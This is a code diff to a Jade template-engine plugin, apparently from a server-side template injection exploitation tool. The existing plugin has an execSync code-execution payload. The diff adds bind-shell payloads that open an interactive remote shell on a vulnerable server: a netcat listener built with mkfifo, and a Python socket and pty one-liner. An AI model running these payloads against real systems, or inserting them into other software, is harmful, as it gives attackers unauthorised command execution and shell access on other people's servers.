@@ -46,12 +46,16 @@ class Jade(Plugin):
         'execute' : {
             'call': 'render',
             'execute': """= global.process.mainModule.require("child_process").execSync("%(code)s")"""
+        },
+        'tcp_shell' : {
+            'call' : 'execute_blind',
+            'tcp_shell_nc': 'rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|%(shell)s -i 2>&1|nc -l %(port)s >/tmp/f; rm -rf /tmp/f',
+            'tcp_shell_python': """python -c 'import pty,os,socket;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(("", %(port)s));s.listen(1);(rem, addr) = s.accept();os.dup2(rem.fileno(),0);os.dup2(rem.fileno(),1);os.dup2(rem.fileno(),2);pty.spawn("%(shell)s");s.close()';"""
         }
-
     }
 
     contexts = [
-    
+
         # Text context, no closures
         { 'level': 0 },
 
@@ -74,7 +78,7 @@ class Jade(Plugin):
     def execute(self, code, prefix = None, suffix = None, blind = False):
         # Quote code before submitting it
         return super(Jade, self).execute(quote(code), prefix, suffix, blind)
-        
+
     def detect_blind_engine(self):
 
         if not self.get('blind'):
